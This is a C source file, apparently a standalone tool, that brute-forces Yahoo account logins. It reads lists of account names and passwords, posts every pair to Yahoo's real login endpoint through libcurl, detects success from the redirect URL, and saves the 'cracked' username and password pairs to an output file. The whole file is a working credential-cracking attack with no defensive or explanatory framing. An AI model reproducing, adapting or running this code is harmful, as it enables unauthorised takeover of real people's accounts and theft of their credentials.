#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<curl/curl.h>

#define BUFF_SIZE 255

const char file_tmp[BUFF_SIZE] = "/tmp/file_load";

int send_request(char *username, char *password){
	CURL *curl;
	CURLcode res;
	FILE *tmp;
	
	struct curl_httppost *formpost = NULL;
	struct curl_httppost *lastptr = NULL;
	struct curl_slist *headerlist = NULL;
	char buf[] = "Content-Type:application/x-www-form-urlencoded;charset=UTF-8";
	char *param[BUFF_SIZE] = {".tries","1",".src","fpctx",".md5","",".hash","",".js","",
			".last","","promo","",".intl","vn",".lang","vi-VN",".bypass","",
			".partner","",".u","63s5vmp7qvhj2",".v","0",".challenge",
			"WbWJYMBJm133edHHWiyYUO8Y_OAe",".yplus","",".emailCode","",
			"pkg","","stepid","",".ev","","hasMsgr","0",".chkP","Y",
			".done","http%3A%2F%2Fvn.yahoo.com%2F",
			".pd","fpctx_ver%3D0%26c%3D6T7evjap2e6CwWSb86QVdqk-%26ivt%3D%26sg%3D",
			".ws","1",".cp","0","nr","0","pad","3","aad","6",
			"login",username,"passwd",password,".save","passwd_raw",""};
	int i;
	curl_global_init(CURL_GLOBAL_ALL);
	for(i = 0; i < 63; i+=2){
		curl_formadd(&formpost,&lastptr,CURLFORM_COPYNAME,param[i],CURLFORM_COPYCONTENTS,param[i+1],CURLFORM_END);
	}
	
	tmp = fopen(file_tmp,"w");
	curl = curl_easy_init();
	headerlist = curl_slist_append(headerlist, buf);
	if(curl){
		curl_easy_setopt(curl, CURLOPT_URL, "https://login.yahoo.com/config/login");
		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA,  tmp);
		
		res = curl_easy_perform(curl);
		if(res != CURLE_OK){
			fprintf(stderr, "curl_easy_perform() failed: %s\n",curl_easy_strerror(res));
			return 0;
		}
	}
	fclose(tmp);
	curl_easy_cleanup(curl);
	curl_formfree(formpost);
	curl_slist_free_all (headerlist);
	return 1;
}

char* check_response(){
	FILE *fRead;
	char *buff;
	
	buff = (char *)malloc(BUFF_SIZE*sizeof(char));
	
	fRead = fopen(file_tmp,"r");
	if(!fRead){
		fprintf(stderr,"[!] Error Data Not Found");
		return NULL;
	}
	fseek(fRead,40,SEEK_SET);
	fscanf(fRead,"%s",buff);
	buff[strlen(buff)-1]='\0';
	fclose(fRead);
	remove(file_tmp);
	return buff;
}

void cracking(char *db_pass,char *db_account,char *db_out){
	FILE *fRead_Pass;
	FILE *fRead_Account;
	FILE *fRead_Out;
	
	char *buff1,*buff2;
	char *res,*out;
	long count = 0;
	
	buff1 = (char *)malloc(BUFF_SIZE*sizeof(char));
	buff2 = (char *)malloc(BUFF_SIZE*sizeof(char));
	
	if(!db_out){
		db_out = "result.db";
	}
	fRead_Out = fopen(db_out,"a");
	if(!(fRead_Pass = fopen(db_pass,"r"))){
		fprintf(stderr,"[!] Error To Read File %s\n",db_pass);
		return;
	}
	if(!(fRead_Account = fopen(db_account,"r"))){
		fprintf(stderr,"[!] Error To Read File %s\n",db_account);
		return;
	}
	
	while(fgets(buff1,BUFF_SIZE,fRead_Account)){
		if(buff1[strlen(buff1)-1] == '\n'){
			buff1[strlen(buff1)-1]='\0';
		}//delete char \n
		while(fgets(buff2,BUFF_SIZE,fRead_Pass)){
			buff2[strlen(buff2)-1]='\0';  //delete char \n
			send_request(buff1,buff2);
			if(res = check_response()){
				out = (char *)malloc(BUFF_SIZE*sizeof(char));
				sprintf(out,"[+] Test Account %s with Password %s",buff1,buff2);
				if(strncmp(res,"https://login.yahoo.com/config/verify?.done=http%3a//my.yahoo.com",strlen(res)) == 0){
					fprintf(stdout,"%s\n",out);
					fprintf(stdout,"\n[*] Account %s is cracked successfully\n",buff1);
					fprintf(stdout,"---> %s \t=>\t %s\n",buff1,buff2);
					fprintf(fRead_Out,"%s \t=>\t %s\n",buff1,buff2);
					count++;
				}else{
					strcat(out," ==> Failed");
					fprintf(stdout,"%s\n",out);
				}
				free(out);
				sleep(3);
			}
		}
		rewind(fRead_Pass);
	}
	
	fprintf(stdout,"[+] Total : %ld account(s) has been cracked\n",count);
	fprintf(stdout,"[+] File Result Was Save At : %s\n",db_out);
	free(buff1);
	free(buff2);
	fclose(fRead_Account);
	fclose(fRead_Out);
	fclose(fRead_Pass);
}